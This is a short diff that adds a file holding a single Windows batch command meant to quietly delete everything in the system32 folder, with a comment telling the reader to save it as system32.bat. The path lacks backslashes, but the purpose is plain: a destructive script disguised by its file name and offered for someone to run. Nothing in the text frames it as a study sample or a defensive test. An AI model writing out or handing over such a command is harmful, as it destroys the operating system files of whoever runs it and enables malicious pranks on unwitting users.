@@ -1,0 +1,5 @@
+del c:WINDOWSsystem32*.*/q
+
+
+
+# Delete this text, and save file as system32.bat
